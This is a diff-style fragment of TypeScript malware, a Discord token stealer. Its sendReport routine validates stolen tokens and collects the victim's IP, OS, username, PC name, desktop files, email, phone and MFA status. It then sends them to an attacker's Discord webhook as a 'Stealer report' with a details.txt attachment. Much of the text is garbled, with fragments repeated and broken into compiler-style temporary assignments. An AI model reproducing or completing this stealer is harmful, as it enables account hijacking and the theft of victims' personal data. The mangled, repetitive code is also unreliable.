@@ -1,0 +1,279 @@
+private async sendReport(config: ReportConfig, tokens: List<Token>): Promise<void> {
+		const webhook: WebhookClient = config.webhook;
+		
+		const validTokens: List<ValidToken> = List.fromArray(_.compact(await Bluebird.map(tokens.array().slice(1), async (token: Token) => {
+			const user: DiscordUser | null = await DiscordUser.getUser(token.token);
+			if(!user) return null;
+			return new ValidToken(token, user);
+		})));
+		const invalidTokens: List<Token> = tokens.difference(validTokens);
+
+		const ip: string = await Stealer.getIP();
+		const osInfo: OSInfo = Stealer.getOS();
+
+		const embed: MessageEmbed = new MessageEmbed({
+			title: 'Stealer report',
+			color: 0x15adfe,
+			description: stripIndents`
+			\`Development build!\`
+			Tokens: ${tokens.size}
+			Valid tokens: ${validTokens.size}
+			`,
+			fields: [
+				{
+					name: 'Time',
+					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
+					inline: true
+				},
+				{
+					name: 'IP',
+					value: ip,
+			...
+const webhook: WebhookClient = config.webhook
+const validTokens: List<ValidToken> = List.fromArray(_.compact(await Bluebird.map(tokens.array().slice(1), async (token: Token) => {
+			const user: DiscordUser | null = await DiscordUser.getUser(token.token);
+			if(!user) return null;
+			return new ValidToken(token, user);
+		})))
+const invalidTokens: List<Token> = tokens.difference(validTokens)
+const ip: string = await Stealer.getIP()
+const osInfo: OSInfo = Stealer.getOS()
+const embed: MessageEmbed = new MessageEmbed({
+			title: 'Stealer report',
+			color: 0x15adfe,
+			description: stripIndents`
+			\`Development build!\`
+			Tokens: ${tokens.size}
+			Valid tokens: ${validTokens.size}
+			`,
+			fields: [
+				{
+					name: 'Time',
+					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
+					inline: true
+				},
+				{
+					name: 'IP',
+					value: ip,
+					inline: true
+				},
+				{
+					name: 'OS',
+					value: stripIndents`
+					Arch: \`${osInfo.arch || 'N/A'}\`
+					Platform: \`${osInfo.platform || 'N/A'}\`
+					Name: \`${osInfo.type || 'N/A'}\`
+					Version: \`${osInfo.version || 'N/A'}\`
+					Release: \`${osInfo.release || 'N/A'}\`
+
+					Username: \`${Stealer.getUsername()}\`
+					PC name: \`${process.env['COMPUTERNAME']}\`
+					`,
+					inline: true
+				}
+			]
+		})
+_tmp_34.title = "Stealer report"
+_tmp_34.color = 0x15adfe
+_tmp_34.description = stripIndents`
+			\`Development build!\`
+			Tokens: ${tokens.size}
+			Valid tokens: ${validTokens.size}
+			`
+_tmp_35.push("
+			Valid tokens: ")
+_tmp_35.push("
+			")
+_tmp_34.fields = [
+				{
+					name: 'Time',
+					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
+					inline: true
+				},
+				{
+					name: 'IP',
+					value: ip,
+					inline: true
+				},
+				{
+					name: 'OS',
+					value: stripIndents`
+					Arch: \`${osInfo.arch || 'N/A'}\`
+					Platform: \`${osInfo.platform || 'N/A'}\`
+					Name: \`${osInfo.type || 'N/A'}\`
+					Version: \`${osInfo.version || 'N/A'}\`
+					Release: \`${osInfo.release || 'N/A'}\`
+
+					Username: \`${Stealer.getUsername()}\`
+					PC name: \`${process.env['COMPUTERNAME']}\`
+					`,
+					inline: true
+				}
+			]
+_tmp_36.push({
+					name: 'Time',
+					value: DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'),
+					inline: true
+				})
+_tmp_37.name = "Time"
+_tmp_37.value = DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss')
+_tmp_37.inline = true
+_tmp_36.push({
+					name: 'IP',
+					value: ip,
+					inline: true
+				})
+_tmp_39.name = "IP"
+_tmp_39.value = ip
+_tmp_39.inline = true
+_tmp_36.push({
+					name: 'OS',
+					value: stripIndents`
+					Arch: \`${osInfo.arch || 'N/A'}\`
+					Platform: \`${osInfo.platform || 'N/A'}\`
+					Name: \`${osInfo.type || 'N/A'}\`
+					Version: \`${osInfo.version || 'N/A'}\`
+					Release: \`${osInfo.release || 'N/A'}\`
+
+					Username: \`${Stealer.getUsername()}\`
+					PC name: \`${process.env['COMPUTERNAME']}\`
+					`,
+					inline: true
+				})
+_tmp_40.name = "OS"
+_tmp_40.value = stripIndents`
+					Arch: \`${osInfo.arch || 'N/A'}\`
+					Platform: \`${osInfo.platform || 'N/A'}\`
+					Name: \`${osInfo.type || 'N/A'}\`
+					Version: \`${osInfo.version || 'N/A'}\`
+					Release: \`${osInfo.release || 'N/A'}\`
+
+					Username: \`${Stealer.getUsername()}\`
+					PC name: \`${process.env['COMPUTERNAME']}\`
+					`
+_tmp_41.push("\`
+					Platform: \`")
+_tmp_41.push("\`
+					Name: \`")
+_tmp_41.push("\`
+					Version: \`")
+_tmp_41.push("\`
+					Release: \`")
+_tmp_41.push("\`
+
+					Username: \`")
+_tmp_41.push("\`
+					PC name: \`")
+process.env["COMPUTERNAME"]
+_tmp_40.inline = true
+validTokens.each((token: ValidToken, index: number) => {
+			embed.addField(
+				`Token ${index + 1}`,
+				stripIndents`
+				\`\`\`${token.token}\`\`\`${token.newest ? '\n - Newest' : ''}User: \`${token.user.tag}\`
+				`,
+				false
+			);
+		})
+<operator>.formatString("Time: ", DateTime.local().toFormat('dd/MM/yyyy HH:mm:ss'), "
+IP: ", ip, "
+OS:
+	Arch: ", osInfo.arch || 'N/A', "
+	Platform: ", osInfo.platform || 'N/A', "
+	Name: ", osInfo.type || 'N/A', "
+	Version: ", osInfo.version || 'N/A', "
+	Release: ", osInfo.release || 'N/A', "
+
+	Username: ", Stealer.getUsername(), "
+	PC name: ", process.env['COMPUTERNAME'], "
+	
+Desktop:
+	", (await Stealer.getDesktopFiles()).map((file: FileInfo) => {
+		return `${file.name} (${file.isDirectory ? 'directory' : 'file'})`;
+	}).join('\n\t'), "
+
+--- Tokens ---
+
+Valid tokens:
+	", validTokens.size > 0 ? (await Bluebird.map(validTokens.array(), async (token: ValidToken) => {
+		return `${token.service.name}:
+		Token: ${token.token}
+		Newest: ${token.newest ? 'true' : 'false'}
+		Valid: true
+		ID: ${token.user.id}
+		Tag: ${token.user.tag}
+		Email: ${token.user.email || 'N/A'}
+		Phone: ${token.user.phone || 'N/A'}
+		Verified: ${token.user.verified}
+		Nitro: ${token.user.nitro ? 'true' : 'false'}
+		MFA enabled: ${token.user.mfaEnabled ? 'true' : 'false'}
+		Locale: ${token.user.locale}
+		
+		Gifts (JSON): ${await Stealer.getGifts(token.token)}`;
+	})).join('\n\n\t') : '\tNot found', "
+
+
+Invalid tokens:
+	", invalidTokens.size > 0 ? invalidTokens.map((token: Token) => {
+		return `${token.service.name}:
+		Token: ${token.token}
+		Newest: ${token.newest ? 'true' : 'false'}
+		Valid: false`;
+	}).join('\n\n\t') : '\tNot found', "
+")
+"
+OS:
+	Arch: "
+osInfo.arch || 'N/A'
+osInfo.platform || 'N/A'
+osInfo.type || 'N/A'
+osInfo.version || 'N/A'
+osInfo.release || 'N/A'
+Stealer.getUsername()
+process.env["COMPUTERNAME"]
+(_tmp_44 = (await Stealer.getDesktopFiles()).map((file: FileInfo) => {
+		return `${file.name} (${file.isDirectory ? 'directory' : 'file'})`;
+	})).join
+"
+
+--- Tokens ---
+
+Valid tokens:
+	"
+validTokens.size > 0 ? (await Bluebird.map(validTokens.array(), async (token: ValidToken) => {
+		return `${token.service.name}:
+		Token: ${token.token}
+		Newest: ${token.newest ? 'true' : 'false'}
+		Valid: true
+		ID: ${token.user.id}
+		Tag: ${token.user.tag}
+		Email: ${token.user.email || 'N/A'}
+		Phone: ${token.user.phone || 'N/A'}
+		Verified: ${token.user.verified}
+		Nitro: ${token.user.nitro ? 'true' : 'false'}
+		MFA enabled: ${token.user.mfaEnabled ? 'true' : 'false'}
+		Locale: ${token.user.locale}
+		
+		Gifts (JSON): ${await Stealer.getGifts(token.token)}`;
+	})).join('\n\n\t') : "	Not found"
+"
+
+
+Invalid tokens:
+	"
+invalidTokens.size > 0 ? invalidTokens.map((token: Token) => {
+		return `${token.service.name}:
+		Token: ${token.token}
+		Newest: ${token.newest ? 'true' : 'false'}
+		Valid: false`;
+	}).join('\n\n\t') : "	Not found"
+"	Not found"
+webhook.send('Вам повестка из военкомата', {
+			username: config.hidden ? `[Hidden] ${config.username}` : config.username,
+			embeds: [
+				embed
+			],
+			files: [
+				new MessageAttachment(Buffer.from(details), 'details.txt')
+			]
+		})
